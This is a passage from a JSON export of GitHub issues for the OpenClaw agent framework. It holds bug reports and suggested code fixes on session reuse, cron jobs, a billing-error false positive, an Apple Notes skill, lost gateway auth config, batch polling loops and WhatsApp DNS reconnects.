store[params.sessionKey];\n    if (entry?.sessionId && params.reuseSession) {\n        return { sessionEntry: entry, isNewSession: false };\n    }\n    // ... existing new-session logic\n}\n```\n\nOptions:\n1. **`reuseSession: true`** flag on the transform return / mapping config\n2. **Automatic reuse** when sessionKey is consistent (non-random) for webhook hooks\n3. **Session mode** on mappings: `sessionMode: \"isolated\" | \"persistent\"` (default `isolated` for backward compat)\n\n## Workaround\n\nLoad conversation history from an external database into the prompt on every webhook invocation. Works but wastes tokens and adds latency.\n\n## Environment\n\n- OpenClaw 2026.2.6-3\n- Webhook via Evolution API (WhatsApp) with custom transform\n- Model: Gemini 2.5 Flash",
      "state": "open",
      "comments": 1,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/11665",
      "createdAt": "2026-02-08T04:05:02Z",
      "updatedAt": "2026-02-11T04:08:00Z",
      "author": "marieldejesus12",
      "labels": [
        "enhancement"
      ],
      "taxonomy": {
        "channels": [
          "whatsapp"
        ],
        "platforms": [],
        "components": [
          "config",
          "websocket"
        ]
      },
      "commentsData": [
        {
          "id": 3882010533,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/11665#issuecomment-3882010533",
          "createdAt": "2026-02-11T04:08:00Z",
          "updatedAt": "2026-02-11T04:08:00Z",
          "author": "marieldejesus12",
          "body": "Friendly bump on this 🙂 — We're still working around this by injecting conversation history into the prompt on every webhook invocation, which adds ~2-3K tokens per turn and noticeable latency.\n\nHappy to help test or contribute a PR if there's a preferred direction. Option 3 (`sessionMode: \"isolated\" | \"persistent\"` on mappings) feels the cleanest for backward compat — but we'd work with any approach.\n\nThanks for the great project!"
        }
      ]
    },
    {
      "number": 13429,
      "title": "sessions_list shows agent default model instead of actual cron session model",
      "body": "## Bug Description\n\n`sessions_list` returns `model: \"claude-opus-4-6\"` for cron isolated sessions even when the job successfully ran with a different model (e.g., `gemini-3-pro-preview`).\n\nThis caused significant debugging confusion — we spent over an hour assuming the model override was not working, when it actually was.\n\n## Steps to Reproduce\n\n1. Create a cron job with model override:\n```json\n{\n  \"sessionTarget\": \"isolated\",\n  \"payload\": {\n    \"kind\": \"agentTurn\",\n    \"message\": \"test task\",\n    \"model\": \"google-gemini-cli/gemini-3-pro-preview\"\n  }\n}\n```\n\n2. Run the job (succeeds)\n\n3. Check `sessions_list`:\n```\nmodel: \"claude-opus-4-6\"   ← Wrong! Shows agent default\n```\n\n4. Check `sessions_history` → message metadata:\n```\napi: \"google-gemini-cli\"\nprovider: \"google-gemini-cli\"\nmodel: \"gemini-3-pro-preview\"   ← Correct\n```\n\n## Expected Behavior\n\n`sessions_list` should reflect the **actual model used** in the session, not the agent default. The code at `src/cron/isolated-agent/run.ts:440-446` does update `cronSession.sessionEntry.model` after the run, but `sessions_list` still returns the old default value.\n\n## Impact\n\n- Users debugging cron model overrides get wrong information\n- Appears as if expensive models (Opus) are being used when cheap ones (Gemini) are actually running\n- Led to unnecessary troubleshooting cycles\n\n## Environment\n\n- OpenClaw v2026.2.9\n- macOS (local mode)\n\n## Related\n\n- #13425 (cron model provider prefix error message)",
      "state": "open",
      "comments": 0,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/13429",
      "createdAt": "2026-02-10T14:13:34Z",
      "updatedAt": "2026-02-11T04:05:20Z",
      "author": "akari-musubi",
      "labels": [],
      "taxonomy": {
        "channels": [],
        "platforms": [
          "macos"
        ],
        "components": [
          "config",
          "websocket"
        ]
      }
    },
    {
      "number": 13434,
      "title": "False positive: Sub-agent output about billing/payments incorrectly flagged as API error",
      "body": "## Bug Summary\n\nSub-agent output containing legitimate discussion of billing/payment topics is incorrectly flagged as an API billing error and replaced with a generic error message, even when the sub-agent completed successfully.\n\n## Version\n\nOpenClaw `2026.2.6-3` (commit `85ed6c7`)\n\n## Reproduction\n\n### Minimal Steps\n\n1. Spawn a sub-agent with a task that will naturally include \"billing\" and \"payment\" in the response:\n   ```\n   \"Explain how gym membership billing and monthly payment processing works\"\n   ```\n\n2. **Expected:** Parent receives the sub-agent's explanation\n3. **Actual:** Parent receives:\n   ```\n   ⚠️ API provider returned a billing error — your API key has run out of credits or has an insufficient balance.\n   ```\n\n4. Check the sub-agent's transcript: Shows successful completion (`stopReason: \"stop\"`) with a legitimate response\n\n### Real-World Example\n\nEncountered this when a sub-agent researched gym membership details:\n- Sub-agent completed 37 turns successfully\n- Generated comprehensive research document\n- Final output contained: \"**Billing:** Processed through ABC Financial... 26 bi-weekly **payments**\"\n- Parent received billing error instead of actual findings\n- API keys had sufficient credits ($84+ remaining)\n\n## Root Cause\n\n`sanitizeUserFacingText()` applies `isBillingErrorMessage()` to **all** user-facing text, including assistant-generated content.\n\n**Location:** `dist/pi-embedded-helpers-BMI-3k6W.js` (and other build chunks)\n\n```javascript\nfunction isBillingErrorMessage(raw) {\n    const value = raw.toLowerCase();\n    if (!value) return false;\n    if (matchesErrorPatterns(value, ERROR_PATTERNS.billing)) return true;\n    \n    // This catch-all triggers false positives:\n    return value.includes(\"billing\") && (\n        value.includes(\"upgrade\") || value.includes(\"credits\") || \n        value.includes(\"payment\") || value.includes(\"plan\")\n    );\n}\n```\n\n**Affected code paths:**\n- `pi-embedded-helpers-BMI-3k6W.js:535` - `sanitizeUserFacingText()`  \n- `pi-embedded-helpers-BMI-3k6W.js:612` - `isBillingErrorMessage()`  \n- `extensionAPI.js:9861-9875` - Sub-agent announcement where sanitization is applied\n\n## Impact\n\n**Severity: HIGH**\n\n- Sub-agents can complete hours of work successfully\n- Users never see the actual results\n- Misleading error messages suggest billing problems that don't exist  \n- Silent data loss (actual findings are discarded)\n- Affects any research involving financial topics: subscriptions, invoices, payment systems, pricing plans, etc.\n\n## Suggested Fix\n\n`sanitizeUserFacingText()` should distinguish between:\n\n1. **API error responses** (HTTP error payloads, error fields) → apply full sanitization\n2. **Assistant content** (model-generated text) → skip billing/auth error detection\n\nOr at minimum, make `isBillingErrorMessage()` much more specific:\n- Require HTTP status code context (`\"402\"` near `\"error\"` or `\"HTTP\"`)\n- Look for structured error codes (`\"insufficient_credits\"`, `\"payment_required\"`) instead of natural language\n- Don't match on general-purpose words like \"billing\" + \"payment\"\n\n## Workaround\n\nSub-agents discussing financial topics must avoid using \"billing\" and \"payment\" together in their final response. Use alternatives like \"dues\", \"charges\", \"fees\" or restructure sentences.\n",
      "state": "closed",
      "comments": 2,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/13434",
      "createdAt": "2026-02-10T14:20:53Z",
      "updatedAt": "2026-02-11T04:04:15Z",
      "author": "aldopareja",
      "labels": [],
      "taxonomy": {
        "channels": [],
        "platforms": [
          "linux"
        ],
        "components": [
          "config",
          "websocket"
        ]
      },
      "commentsData": [
        {
          "id": 3878305256,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/13434#issuecomment-3878305256",
          "createdAt": "2026-02-10T15:05:15Z",
          "updatedAt": "2026-02-10T15:05:15Z",
          "author": "aldopareja",
          "body": "## ✅ Already Fixed in PR #12946\n\nThis issue has been resolved in PR #12946 (merged ~14 hours before this issue was filed).\n\n**The fix:** Completely removed the problematic catch-all pattern from `isBillingErrorMessage()` instead of adding a length threshold.\n\n**Before (problematic code):**\n```javascript\nexport function isBillingErrorMessage(raw: string): boolean {\n  const value = raw.toLowerCase();\n  if (!value) return false;\n  if (matchesErrorPatterns(value, ERROR_PATTERNS.billing)) return true;\n  \n  // Catch-all causing false positives:\n  return (\n    value.includes(\"billing\") &&\n    (value.includes(\"upgrade\") || value.includes(\"credits\") ||\n     value.includes(\"payment\") || value.includes(\"plan\"))\n  );\n}\n```\n\n**After (current main branch):**\n```javascript\nexport function isBillingErrorMessage(raw: string): boolean {\n  const value = raw.toLowerCase();\n  if (!value) return false;\n  return matchesErrorPatterns(value, ERROR_PATTERNS.billing);\n}\n```\n\nThe catch-all has been completely removed. Only specific patterns in `ERROR_PATTERNS.billing` are matched now:\n- `/\\b402\\b/`\n- \"payment required\"\n- \"insufficient credits\"\n- \"credit balance\"\n- \"plans & billing\"\n- \"insufficient balance\"\n\n**Recommendation:** Close this issue as duplicate/already fixed. The fix will be in the next release after `2026.2.6-3`.\n\ncc: @openclaw/maintainers"
        },
        {
          "id": 3878306222,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/13434#issuecomment-3878306222",
          "createdAt": "2026-02-10T15:05:22Z",
          "updatedAt": "2026-02-10T15:05:22Z",
          "author": "aldopareja",
          "body": "Closing as this was fixed in PR #12946, which removed the catch-all pattern entirely (better than the length threshold approach proposed here)."
        }
      ]
    },
    {
      "number": 13532,
      "title": "[Bug]: apple-notes skill — note creation always produces \"New Note\" title",
      "body": "## Summary\n\nThe bundled `apple-notes` skill has two problems that prevent note titles from being set correctly:\n\n1. **SKILL.md documents a nonexistent feature**: The skill instructs the agent to use `memo notes -a \"Note Title\"` for \"Quick add with title,\" but memo's `-a`/`--add` flag is a boolean — it does not accept a title argument. Running `memo notes --help` confirms:\n   ```\n   -a, --add    Add a note to the specified folder.\n   ```\n   There is no positional argument for title. The agent follows the skill's instructions, the command silently ignores the extra argument, and the note gets the wrong title.\n\n2. **The underlying `memo` CLI hardcodes the note name**: In `addmemo.py` (line 33-34, memo v0.3.3), the AppleScript template is:\n   ```python\n   make new note with properties {{name:\"New Note\", body:\"{note_html}\"}}\n   ```\n   The `name` property is always `\"New Note\"` regardless of what the user writes in the editor. Even through the valid editor-based workflow with a markdown heading as the first line, memo ignores it.\n\nA separate issue has been filed upstream on the memo CLI: https://github.com/antoniorodr/memo/issues/14\n\n## Steps to reproduce\n\n1. Install memo via `brew install antoniorodr/memo/memo`\n2. Have OpenClaw use the apple-notes skill to create a note with a specific title\n3. The agent calls `memo notes -a \"My Title\"` (as documented in SKILL.md)\n4. Observe the note appears in Apple Notes with title \"New Note\" instead of \"My Title\"\n\n## Expected behavior\n\nWhen the agent creates a note with a title (e.g., \"Meeting Notes — Feb 10\"), the resulting Apple Note should have that title.\n\n## Actual behavior\n\nEvery note created via the skill gets the title \"New Note\" in Apple Notes.\n\n## Suggested fix\n\nUpdate the bundled `skills/apple-notes/SKILL.md` to:\n- Remove the incorrect `memo notes -a \"Note Title\"` syntax (this feature doesn't exist in memo)\n- For note creation, instruct the agent to use direct AppleScript + mistune (which memo already bundles) to bypass memo's hardcoded title:\n\n```python\nimport subprocess, mistune\n\nnote_title = \"My Note Title\"\nnote_md = \"## Overview\\n\\nNote content here...\"\nnote_html = mistune.html(note_md)\n\n# Escape for AppleScript\ntitle_escaped = note_title.replace('\\\\', '\\\\\\\\').replace('\"', '\\\\\"')\nhtml_escaped = note_html.replace('\\\\', '\\\\\\\\').replace('\"', '\\\\\"')\n\nscript = f\\'\\'\\'\ntell application \"Notes\"\n    tell folder \"Notes\"\n        make new note with properties {{name:\"{title_escaped}\", body:\"{html_escaped}\"}}\n    end tell\nend tell\n\\'\\'\\'\nsubprocess.run(['osascript', '-e', script], capture_output=True, text=True)\n```\n\nMistune is available at memo's bundled Python: `/opt/homebrew/Cellar/memo/0.3.3/libexec/bin/python3`\n\nKeep all other memo operations (list, edit, delete, search, move, export) unchanged — only note creation is affected.\n\n## Environment\n\n- OpenClaw: latest\n- OS: macOS Sequoia (Apple Silicon)\n- memo: v0.3.3 (Homebrew)\n- Install method: npx",
      "state": "open",
      "comments": 1,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/13532",
      "createdAt": "2026-02-10T17:08:47Z",
      "updatedAt": "2026-02-11T04:03:44Z",
      "author": "MarknMilo",
      "labels": [
        "bug"
      ],
      "taxonomy": {
        "channels": [],
        "platforms": [
          "macos",
          "linux"
        ],
        "components": [
          "websocket"
        ]
      },
      "commentsData": []
    },
    {
      "number": 13835,
      "title": "Config rewrite after update/doctor can drop gateway.auth (token auth missing after update)",
      "body": "## Summary\n\nAfter running `openclaw update` (and/or subsequent `openclaw doctor` flows), token authentication configured in `~/.openclaw/openclaw.json` can be lost. Specifically, the `gateway.auth` section disappears from the rewritten config file. As a result:\n\n- `openclaw doctor` repeatedly reports that gateway auth is off or missing a token.\n- In some cases, the gateway fails to start when `mode=token` is set but no token is present.\n\n---\n\n## Environment\n\n- **OpenClaw**: 2026.2.9 (installed via npm/pnpm; not a git checkout)\n- **OS**: macOS (arm64)\n- **Config file**: `~/.openclaw/openclaw.json`\n- **Gateway**: Local, bind = loopback\n\n---\n\n## What I See\n\n- `openclaw doctor` prompts/warns:\n\n\n\nGateway auth is off or missing a token. Token auth is now the recommended default (including loopback).\n\n- During `doctor` / `update` flows, the config file is rewritten.\n- The resulting `openclaw.json` no longer contains `gateway.auth`, even though it was present before.\n\n---\n\n## Evidence\n\n- CLI output includes messages such as:\n- `Updated ~/.openclaw/openclaw.json` (with a `.bak` backup created)\n- Backup history (timestamps omitted) clearly shows the regression:\n- `openclaw.json.bak.4 / .3 / .2 / .1`: `gateway.auth` **present** (`mode=token`, `token=...`)\n- `openclaw.json.bak`: `gateway.auth` **missing**\n\n---\n\n## Impact\n\n- `openclaw doctor` continuously reports missing gateway authentication.\n- In some cases, the gateway fails to start with an error similar to:\n\n\n\ngateway auth mode is token, but no token was configured\n(set gateway.auth.token or OPENCLAW_GATEWAY_TOKEN)\n\n\n\n\n---\n\n## Expected Behavior\n\nConfig write / repair / migration logic should **preserve existing `gateway.auth`** (e.g. via deep merge), or explicitly carry it forward during normalization—especially since token auth is now the recommended default, even for loopback gateways.\n\n---\n\n## Workaround\n\nManually re-add the following to `~/.openclaw/openclaw.json`:\n\n```json\n{\n\"gateway\": {\n  \"auth\": {\n    \"mode\": \"token\",\n    \"token\": \"<your-token>\"\n  }\n}\n}\n\n\n\nOr set the environment variable instead:\n\nexport OPENCLAW_GATEWAY_TOKEN=<your-token>\n",
      "state": "open",
      "comments": 1,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/13835",
      "createdAt": "2026-02-11T02:52:20Z",
      "updatedAt": "2026-02-11T04:03:22Z",
      "author": "kts-kris",
      "labels": [],
      "taxonomy": {
        "channels": [],
        "platforms": [
          "macos"
        ],
        "components": [
          "gateway",
          "config",
          "websocket"
        ]
      },
      "commentsData": [
        {
          "id": 3881999484,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/13835#issuecomment-3881999484",
          "createdAt": "2026-02-11T04:03:22Z",
          "updatedAt": "2026-02-11T04:03:22Z",
          "author": "0xRaini",
          "body": "Ouch — losing `gateway.auth` silently is a serious issue, especially for remote deployments.\n\n**Likely root cause:** The update/doctor config rewrite does a full `config.apply` (replace) instead of a merge. If the rewrite logic doesn't read the existing `gateway.auth` block before writing, it gets dropped.\n\n**Suggested fix:**\n\n1. **Before any config rewrite**, deep-merge the existing config with the new one instead of replacing:\n```ts\nconst existing = await readConfig();\nconst merged = deepMerge(existing, newConfig);\nawait writeConfig(merged);\n```\n\n2. **Or at minimum**, preserve `gateway.auth` explicitly:\n```ts\nif (existing.gateway?.auth && !newConfig.gateway?.auth) {\n  newConfig.gateway = { ...newConfig.gateway, auth: existing.gateway.auth };\n}\n```\n\n3. **Add a safety check** in `config.apply` that warns if security-sensitive fields are being removed:\n```\n⚠️  gateway.auth will be removed by this config change. Continue? (y/n)\n```\n\nThis is especially important because losing auth on a public-facing gateway leaves it unprotected until someone notices.\n\nHappy to submit a PR for this!"
        }
      ]
    },
    {
      "number": 13859,
      "title": "[Bug]: Batch API Status Cache Stuck in `in_progress` State - Infinite Polling Loop",
      "body": "## Severity\n**HIGH** - Silent failure with continuous API polling and log spam\n\n## Environment\n- **Machine:** MacBook Pro M1 Max\n- **OS:** macOS 15.7.3 (Sequoia)\n- **OpenClaw Version:** 2026.2.9\n- **Node Version:** 25.5.0\n\n## Description\n\nThe memory plugin's batch status cache becomes stale and stuck in an `in_progress` state even though OpenAI Batch API marks the batch as `completed`. This causes the memory plugin to enter an infinite polling loop, checking the batch status every 2-3 seconds indefinitely, resulting in excessive logging, API quota waste, and silent failure.\n\n## Batch ID Affected\n`batch_698bf8473b6c819091f76c4fb4842d8e`\n\n## Symptoms\n\n- Batch marked as `completed` on OpenAI side (verified via API)\n- Memory plugin continues polling the batch every 2-3 seconds\n- Log spam in gateway logs: repeated \"batch [ID] in_progress; waiting 2000ms\" messages\n- No error message or user-facing alert\n- Silent failure - functionality appears to work but cache is stale\n- Issue persists indefinitely until gateway restart\n\n### Sample Log Output\n```\n03:34:21 debug memory {\"subsystem\":\"memory\"} {\"source\":\"memory\",\"chunks\":3} openai batch batch_698bf8473b6c819091f76c4fb4842d8e in_progress; waiting 2000ms\n03:34:23 debug memory {\"subsystem\":\"memory\"} {\"source\":\"memory\",\"chunks\":3} openai batch batch_698bf8473b6c819091f76c4fb4842d8e in_progress; waiting 2000ms\n03:34:25 debug memory {\"subsystem\":\"memory\"} {\"source\":\"memory\",\"chunks\":3} openai batch batch_698bf8473b6c819091f76c4fb4842d8e in_progress; waiting 2000ms\n03:34:28 debug memory {\"subsystem\":\"memory\"} {\"source\":\"memory\",\"chunks\":3} openai batch batch_698bf8473b6c819091f76c4fb4842d8e in_progress; waiting 2000ms\n[... continues indefinitely ...]\n```\n\n## Root Cause Analysis\n\n1. **No Automatic Cache Invalidation:** The memory plugin caches batch status in-memory but has no mechanism to invalidate the cache when batch status transitions to `completed`\n\n2. **Polling Interval Mismatch:** The plugin polls every 2-3 seconds (violates OpenAI's recommendation of 30+ seconds with exponential backoff)\n\n3. **In-Memory State Only:** Batch tracking state is stored only in RAM, not persisted to SQLite. When batch completes, the cache is never refreshed, creating a stale state\n\n4. **No Recovery Mechanism:** There's no timeout, max iteration count, or state validation to detect and recover from stuck polling states\n\n5. **Race Condition Possible:** Batch may complete between poll cycles, but status update is not properly handled by the cache coherence mechanism\n\n## Expected Behavior\n\n1. Memory plugin detects batch completion from OpenAI API\n2. Cache invalidates on status transition to `completed`\n3. Polling stops after 1-2 cycles\n4. No excessive logging or API calls\n\n## Actual Behavior\n\n1. OpenAI marks batch as `completed`\n2. Memory plugin cache remains in `in_progress` state\n3. Polling continues every 2-3 seconds indefinitely\n4. Log spam accumulates\n5. Only stops on gateway restart (clears in-memory cache)\n\n## Reproduction Steps\n\n1. Enable `memorySearch` with batch API in config:\n   ```json\n   {\n     \"agents\": {\n       \"defaults\": {\n         \"memorySearch\": {\n           \"enabled\": true,\n           \"provider\": \"openai\",\n           \"remote\": {\n             \"baseUrl\": \"https://api.openai.com/v1/\",\n             \"batch\": {\n               \"enabled\": true\n             }\n           }\n         }\n       }\n     }\n   }\n   ```\n\n2. Trigger a large batch embedding job (e.g., index 1000+ chunks)\n\n3. Wait for batch to complete on OpenAI side (usually 1-5 minutes for small batches)\n\n4. Observe logs - batch polling continues indefinitely despite completion\n\n5. Verify via OpenAI API: `GET /v1/batches/{batch_id}` returns `status: \"completed\"`\n\n6. Memory plugin still shows polling as if `status: \"in_progress\"`\n\n## Workarounds\n\n**Temporary Fix 1: Increase Polling Interval**\n```json\n{\n  \"remote\": {\n    \"batch\": {\n      \"pollIntervalMs\": 30000  // Increase from 2-3s to 30s\n    }\n  }\n}\n```\n\n**Temporary Fix 2: Disable Batch Mode**\n```json\n{\n  \"remote\": {\n    \"batch\": {\n      \"enabled\": false  // Force synchronous embedding (slower but no polling issues)\n    }\n  }\n}\n```\n\n**Temporary Fix 3: Disable Memory Search Entirely**\n```json\n{\n  \"agents\": {\n    \"defaults\": {\n      \"memorySearch\": {\n        \"enabled\": false\n      }\n    }\n  }\n}\n```\nThen restart gateway: `openclaw gateway restart`\n\n## Recommended Fixes\n\n### Short-Term (v2026.2.10)\n1. **Increase default polling interval** from 2-3 seconds to 30 seconds (aligns with OpenAI recommendations)\n2. **Implement polling timeout:** Stop polling after 30 minutes of continuous `in_progress` state\n3. **Add state validation:** Force refresh from OpenAI API if state hasn't changed in > 5 minutes\n\n### Long-Term (v2026.3.0)\n1. **Persist batch state to SQLite:** Store batch ID, status, timestamps in database (not just RAM)\n2. **Implement state machine:** Proper lifecycle: `created` → `validating` → `in_progress` → `finalizing` → `completed`\n3. **Exponential backoff:** Start at 5s, increase to 30s, then 5min, then 1hr as time passes\n4. **Cache invalidation strategy:** TTL-based (30s expiry) + event-based on transitions\n5. **Add observability:** Log state transitions (not just polling), metrics for batch tracking\n6. **Configuration validation:** Warn if `pollIntervalMs < 10000` (too aggressive)\n\n## Impact\n\n- **API Quota:** Continuous polling wastes OpenAI API calls\n- **Logging:** Significant log spam (disk I/O, storage consumption)\n- **Memory Search:** Core functionality affected until workaround applied\n- **User Experience:** Silent failure with no error message (invisible to users)\n- **Performance:** Polling threads consuming CPU cycles indefinitely\n\n## Related Issues\n\n- Possible relation to Issue #8921: \"status: non-core memory plugins reported as 'unavailable'\"\n- Memory plugin state tracking has been documented as problematic in previous versions\n\n## Testing Checklist\n\n- [ ] Batch state persists to SQLite across gateway restarts\n- [ ] Cache invalidates on completion status transition\n- [ ] Polling stops within 2 cycles of batch completion\n- [ ] Exponential backoff reduces polling frequency over time\n- [ ] Timeout triggers alert/error after 30 minutes in `in_progress`\n- [ ] Config validation warns about aggressive polling intervals\n- [ ] No log spam with 100+ concurrent embedding batches\n- [ ] OpenAI API request rate for batch status < 2/minute after completion\n- [ ] Memory search status visible via `openclaw status --memory`\n\n## Additional Context\n\nThis issue was identified through rigorous investigation using OpenClaw itself, including API verification and log analysis. A comprehensive technical investigation report has been prepared documenting the root cause, severity assessment, and detailed fix recommendations.\n\nThe batch API integration in the memory plugin is a powerful feature for large-scale embedding operations, but this state management issue creates a reliability concern. Proper cache coherence and state persistence will make the feature production-ready.\n",
      "state": "open",
      "comments": 1,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/13859",
      "createdAt": "2026-02-11T03:53:36Z",
      "updatedAt": "2026-02-11T04:03:10Z",
      "author": "aivay01",
      "labels": [
        "bug"
      ],
      "taxonomy": {
        "channels": [],
        "platforms": [
          "macos",
          "linux"
        ],
        "components": [
          "gateway",
          "config",
          "websocket"
        ]
      },
      "commentsData": [
        {
          "id": 3881999065,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/13859#issuecomment-3881999065",
          "createdAt": "2026-02-11T04:03:10Z",
          "updatedAt": "2026-02-11T04:03:10Z",
          "author": "0xRaini",
          "body": "This looks like a missing terminal state transition in the batch polling loop.\n\n**Likely cause:** The batch status check keeps returning `in_progress` (possibly from a stale cache or the API itself being stuck), and there's no max retry / timeout to break out of the loop.\n\n**Suggested fix:**\n\n1. **Add a max poll count or wall-clock timeout:**\n```ts\nconst MAX_POLL_DURATION_MS = 30 * 60 * 1000; // 30 min\nconst startedAt = Date.now();\n\nwhile (status === 'in_progress') {\n  if (Date.now() - startedAt > MAX_POLL_DURATION_MS) {\n    status = 'failed';\n    log.warn('Batch poll timeout — transitioning to failed');\n    break;\n  }\n  await sleep(pollInterval);\n  status = await checkBatchStatus(batchId);\n}\n```\n\n2. **Implement exponential backoff** on the poll interval to reduce API pressure during long waits.\n\n3. **Cache invalidation:** If the status hasn't changed after N consecutive polls, force a fresh (non-cached) API call.\n\nWould be helpful to know: is this happening with a specific provider's batch API, or is it the internal OpenClaw batching? Happy to dig into the code and submit a fix!"
        }
      ]
    },
    {
      "number": 13845,
      "title": "[Bug] One-shot systemEvent cron jobs (deleteAfterRun) fire repeatedly on gateway restart",
      "body": "## Bug Description\n\nOne-shot cron jobs (`schedule.kind: \"at\"` + `deleteAfterRun: true` + `sessionTarget: \"main\"` + `payload.kind: \"systemEvent\"`) fire repeatedly when the gateway restarts after the scheduled time has passed.\n\nThe jobs get `lastStatus: \"skipped\"` (likely because the main session is busy), which does not count as a successful run, so `deleteAfterRun` never triggers. On each subsequent gateway restart, the overdue job is re-evaluated and re-injected, causing dozens of duplicate systemEvents.\n\n## Environment\n\n- **OpenClaw Version:** 2026.2.6-3\n- **OS:** macOS 15.7.3 (ARM64)\n- **Node:** v22.22.0\n- **Channel:** Telegram\n\n## Steps to Reproduce\n\n1. Create a one-shot reminder:\n```json\n{\n  \"schedule\": { \"kind\": \"at\", \"at\": \"2026-02-10T22:30:00.000Z\" },\n  \"payload\": { \"kind\": \"systemEvent\", \"text\": \"⏰ Reminder: Time to workout!\" },\n  \"sessionTarget\": \"main\",\n  \"deleteAfterRun\": true\n}\n```\n\n2. Let the scheduled time pass while the main session is active (chatting with user)\n\n3. The systemEvent fires but gets `lastStatus: \"skipped\"`\n\n4. Restart the gateway (e.g., via `config.patch` or `openclaw gateway restart`)\n\n5. **Observe:** The same reminder fires again. Repeat step 4 → fires again each time.\n\nIn our case, multiple config changes triggered ~10 gateway restarts in an evening, resulting in 20+ duplicate reminder messages flooding the session.\n\n## Expected Behavior\n\n- Overdue `at` jobs with `deleteAfterRun: true` should be deleted (or at minimum disabled) after the scheduled time passes, regardless of whether the delivery was \"skipped\"\n- A `systemEvent` injection should not be skippable — it is a fire-and-forget text injection, not an agent turn that can fail\n\n## Actual Behavior\n\n- The job stays alive with `lastStatus: \"skipped\"` and `deleteAfterRun` never fires\n- Each gateway restart re-injects the systemEvent, causing duplicates\n- The only fix is manually removing the job via `cron remove`\n\n## Cron Job State After Bug\n\n```json\n{\n  \"lastStatus\": \"skipped\",\n  \"lastDurationMs\": 0,\n  \"runningAtMs\": 1770774567831\n}\n```\n\n## Workaround\n\nUse `sessionTarget: \"isolated\"` + `payload.kind: \"agentTurn\"` instead of `main` + `systemEvent` for one-shot reminders. Isolated jobs complete independently and trigger `deleteAfterRun` correctly.\n\n## Related\n\n- #5806 (session state persists across restarts causing infinite loops)\n- Herbert Yang's report on orphaned `.tmp` files in cron recovery logic",
      "state": "open",
      "comments": 1,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/13845",
      "createdAt": "2026-02-11T03:07:33Z",
      "updatedAt": "2026-02-11T04:02:59Z",
      "author": "bruceeewong",
      "labels": [],
      "taxonomy": {
        "channels": [
          "telegram"
        ],
        "platforms": [
          "macos"
        ],
        "components": [
          "gateway",
          "config"
        ]
      },
      "commentsData": [
        {
          "id": 3881998656,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/13845#issuecomment-3881998656",
          "createdAt": "2026-02-11T04:02:59Z",
          "updatedAt": "2026-02-11T04:02:59Z",
          "author": "0xRaini",
          "body": "This is a real pain point — duplicate reminders flooding the session.\n\n**Root cause analysis:** The `at` scheduler re-evaluates overdue jobs on restart, but `lastStatus: \"skipped\"` doesn't count as a completed run, so `deleteAfterRun` never fires.\n\n**Two-part fix suggestion:**\n\n1. **For `systemEvent` payloads:** These are fire-and-forget text injections — they should never be \"skippable\". The main session might be busy, but a systemEvent is just appending text to context, not starting an agent turn. Inject it regardless.\n\n2. **For `at` jobs past their scheduled time:** Add a grace window check. If `now - job.at > graceWindowMs` (e.g. 5 min), mark the job as expired and trigger `deleteAfterRun` cleanup instead of re-firing:\n\n```ts\nif (schedule.kind === 'at' && isOverdue(job)) {\n  const elapsed = Date.now() - new Date(schedule.at).getTime();\n  if (elapsed > GRACE_WINDOW_MS || job.lastStatus === 'skipped') {\n    // Overdue + already attempted → treat as done\n    if (job.deleteAfterRun) await removeJob(job.id);\n    return;\n  }\n}\n```\n\nThis prevents the restart loop while still allowing a brief retry window for genuinely missed jobs.\n\nHappy to take this on if you'd like a PR!"
        }
      ]
    },
    {
      "number": 13544,
      "title": "Openclaw: Problems with dns failure",
      "body": "## Summary\n\nIssue Report: WhatsApp Gateway DNS Hiccup & Timeout Reconnects\n\n## Steps to reproduce\n\n1. Not sure\n2.\n3.\n\n## should reconnect\n\n## Actual behavior\n\n1. **DNS Glitch:** Experienced a disconnect at 02:02 CST with error `EAI_AGAIN web.whatsapp.com`. The gateway stayed disconnected until a manual restart later that morning.\n2. **Aggressive Heartbeat:** Noticed that the gateway intentionally forces a reconnect (status 499) after exactly 30 minutes of message inactivity (\"No messages received in 30m - restarting connection\"). While it reconnects quickly, it causes a \"gateway disconnected/connected\" system alert loop for the user during quiet periods.\n\n**Suggested Improvements:**\n- Could the gateway be more resilient to transient DNS/EAI_AGAIN errors before staying down?\n- Is the 30-minute hard-reconnect necessary if the WebSocket still appears healthy, or could that interval be configurable to reduce \"disconnect\" notification\n\n## Environment\n\n- openclaw version: We are currently on version **2026.2.6-3** (build 85ed6c7).\n- OS: Raspberry PI OS\n- wizard install\n\n## Logs or screenshots\n\nPaste relevant logs or add screenshots (redact secrets).\n",
      "state": "open",
      "comments": 2,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/13544",
      "createdAt": "2026-02-10T17:46:31Z",
      "updatedAt": "2026-02-11T03:57:46Z",
      "author": "akessel56",
      "labels": [
        "bug"
      ],
      "taxonomy": {
        "channels": [
          "whatsapp"
        ],
        "platforms": [],
        "components": [
          "gateway",
          "config",
          "websocket"
        ]
      },
      "commentsData": [
        {
          "id": 3879772396,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/13544#issuecomment-3879772396",
          "createdAt": "2026-02-10T17:47:44Z",
          "updatedAt": "2026-02-10T17:47:44Z",
          "author": "akessel56",
          "body": "Here is the specific log entry for that DNS error at 2:02 AM:\n\n```json\n{\n\"module\": \"web-session\",\n\"error\": \"Error: getaddrinfo EAI_AGAIN web.whatsapp.com\",\n\"message\": \"WebSocket error\",\n\"time\": \"2026-02-10T08:02:52.950Z\"\n}\n```\n\nAnd then when I checked the status later, it looked like this:\n\n```text\nerror:{\"error\":{\"data\":{\"errno\":-3001,\"code\":\"EAI_AGAIN\",\"syscall\":\"getaddrinfo\",\"hostname\":\"web.whatsapp.com\"},\"output\":{\"statusCode\":408,\"payload\":{\"message\":\"WebSocket Error (getaddrinfo EAI_AGAIN web.whatsapp.com)\"}}}}\n```\n\nThis confirms the system was trying to talk to `web.whatsapp.com` but couldn't resolve the address."
        },
        {
          "id": 3881987999,
